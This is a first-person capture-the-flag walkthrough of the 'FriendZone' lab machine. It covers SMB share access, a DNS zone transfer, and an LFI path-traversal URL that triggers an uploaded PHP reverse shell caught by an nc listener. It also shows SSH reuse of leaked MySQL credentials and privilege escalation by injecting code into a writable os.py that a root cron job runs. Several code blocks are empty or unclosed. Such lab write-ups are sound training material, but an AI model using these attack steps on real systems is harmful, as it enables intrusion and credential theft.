First I start with an Nmap scan

```
# nmap -sV -sC -T4 10.10.10.123                                                                                                                                         [4/1115]

```
A decent amount of ports are open but something I noticed is under <b>Port 443</b> it mentions a common name <b>friendzone.red</b>. Seeing this I put <b>friendzone.red</b> in my <b>/etc/hosts</b> file.
```
127.0.0.1       localhost
127.0.1.1       edc
10.10.10.123    friendzone.red

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Before I Int and explored port <b>80</b> and <b>443</b> I wanted to check out some of the other ports to see if I could find anything useful. I used <b>smbclient</b> to list the share folders. When it asks for a password just leave it blank
```
smbclient -L 10.10.10.123
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers

        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```
After checking through the folders I discovered that I have Read/Write permissions to the <b>Development</b> folder and inside the <b>general</b> folder there is a file with some credentials.
```
# smbclient -U none //10.10.10.123/general password

```
Now to explore port <b>53</b>. I use <b>dig</b> for this
```
# dig axfr friendzone.red @10.10.10.123

```
From the output I can see a few subdomains. Lets add these to the <b>/etc/hosts</b> file as Ill
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       edc
10.10.10.123    friendzone.red
10.10.10.123    administrator1.friendzone.red
10.10.10.123    hr.friendzone.red
10.10.10.123    uploads.friendzone.red

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Time to explore some of those domains. Navigating to <b>https://administrator1.friendzone.red</b> I get greeted with a login page. This would be a good time to try those credentials.

![login.png](../../resources/b257236405844774b8211e7fd01df6f6.png)

Once logged in I are greeted with a success message and it tells us another directory to visit.

![success.png](../../resources/6246a5190ad44840a93adcf076d8e1f4.png)

Navigating to <b>/dashboard.php</b> I are greeted with a message that basically tells us that the page is vulnerable.

![vuln.png](../../resources/be2cb7b78a8246029b2257e2787c9330.png)

If I add the included paramater to the link then I are greeted with yet another message that tells us the parameter is wrong witch hints that I need to use an LFI

![parameter.png](../../resources/b1250ca8039847019f214f59b1d1f0bd.png)

So for the LFI I are going to upload the reverse shell to the <b>Development</b> share since I have Read/Write privileges to it.

```
# smbclient -U none //10.10.10.123/Development password
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (30.8 kb/s) (average 30.8 kb/s)
```
Now I set up our <b>nc</b> listener on the port I specified in our shell
```
# nc -lvnp 10000
listening on [any] 10000 ...
```
Took me some time to find where the Development folder is stored but after some time I found it. To trigger the LFI navigate to <b>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../..//etc/Development/php-reverse-shell</b>. Just make sure you put in the name of your shell and not mine. If you did everything correctly you should get a shell.
```
# nc -lvnp 10000
listening on [any] 10000 ...

/bin/sh: 0: can't access tty; job control turned off
$ whoami

```
This next step is not necessary but I did it just to give myself a more responsive shell
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/$ ^Z
[1]+  Stopped                 nc -lvnp 10000
# stty raw -echo; fg
nc -lvnp 10000

www-data@FriendZone:/$
```
Now I have a shell with tab complete. At this point you can go to <b>/home/friend/</b> and read the <b>user.txt</b> file. I do some basic enumeration and eventually find a <b>mysql_data.conf</b> in <b>/var/www</b>.
```
ls /var/www
admin       friendzoneportal       html             uploads
friendzone  friendzoneportaladmin  mysql_data.conf
```
If I read the file I see some credentials.
```
# cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
Even though the credentials say they are for a mysql database I decided to try them in ssh. Turns out they worked.
```
# ssh friend@10.10.10.123

I first decide to run an Enum script to see what it can find. I am going to use a <b>python SimpleHTTPServer</b> to copy the script over from my host machine.
```
# python -m SimpleHTTPServer 80

```
Then I use <b>wget</b> on the box to download it.
```

Make the file executable and then run it. You might have to wait a little bit but eventually you should see something interesting.
```
2019/09/19 22:02:01 CMD: UID=0    PID=1445   | /bin/sh -c /opt/server_admin/reporter.py
2019/09/19 22:02:01 CMD: UID=0    PID=1444   | /bin/sh -c /opt/server_admin/reporter.py
```
I have a python file that is being executed as root. Lets check that file out to see if I can do anything.
```
friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
So I have read permissions. Reading the file I see something good.
```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
The script doesn't do too much but it does use the <b>os</b> module which if you remember from the Enum scipt I know that I have write permissions to it. So lets edit the <b>/usr/lib/python2.7/os.py</b> and add in some code at the top that reads the root flag for us.
```
with open('/root/root.txt', 'r') as f:
  output = f.readline()
with open('/tmp/rootpass.txt', 'w') as o:
  o.write(output)
```
Now just wait a little bit and you should see the <b>rootpass.txt</b> file in the </b>/tmp</b> fdirectory with the root flag inside it.
